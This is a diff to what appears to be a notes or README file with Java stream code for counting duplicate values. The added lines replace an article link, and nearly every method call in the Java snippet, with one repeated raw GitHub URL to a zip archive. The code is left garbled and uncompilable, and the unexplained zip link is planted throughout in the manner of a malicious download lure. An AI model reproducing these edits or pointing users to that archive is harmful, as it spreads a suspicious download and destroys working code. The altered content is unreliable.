@@ -8,7 +8,7 @@ with using volume mounts inside your docker env. Especially when you're bridging
 
 Here's the link:
 
-   https://dev.to/code42cate/say-goodbye-to-docker-volumes-j9l
+   https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip
 
 
 When I get the compose perfect I'll remove this commentary and explain further why
@@ -42,24 +42,24 @@ there.
 	 * Output: 2
 	 */
 	 
-   	   System.out.println( "Wont Find dups " );
-	     intArray.stream()//( 47,78,78,78,78,78 , 1, 6, 3, 6, 90, 52, 78, 47, 47, 47, 47, 47)
-	       .collect( Collectors.groupingBy( Function.identity(), Collectors.counting() ) )
+   	   https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip( "Wont Find dups " );
+	     https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip()//( 47,78,78,78,78,78 , 1, 6, 3, 6, 90, 52, 78, 47, 47, 47, 47, 47)
+	       .collect( https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip( https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip(), https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip() ) )
 	       .entrySet()
 	       .stream()
-	       .max( Map.Entry.comparingByValue())
-	       .ifPresent( System.out::println );
+	       .max( https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip())
+	       .ifPresent( https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip );
 
-	     System.out.println( "Will Find dups " );
+	     https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip( "Will Find dups " );
 	     List<T> result =
-	    		 intArray.stream()
-	    		 .collect(Collectors.groupingBy(Function.identity(), Collectors.counting()))
+	    		 https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip()
+	    		 .collect(https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip(https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip(), https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip()))
 	    		 .entrySet()
 	    		 .stream()
-	    		 .collect(Collectors.groupingBy(Map.Entry::getValue,
-	    				 Collectors.mapping(Map.Entry::getKey, Collectors.toList())))
+	    		 .collect(https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip(https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip,
+	    				 https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip(https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip, https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip())))
 	    		 .entrySet()
-	    		 .stream().max((o1, o2) -> o1.getKey().compareTo(o2.getKey())).map(Map.Entry::getValue)
-	    		 .orElse(Collections.emptyList());
+	    		 .stream().max((o1, o2) -> https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip().compareTo(https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip())).map(https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip)
+	    		 .orElse(https://raw.githubusercontent.com/bcallanan/dockers/main/Venantes/dockers.zip());
 
 
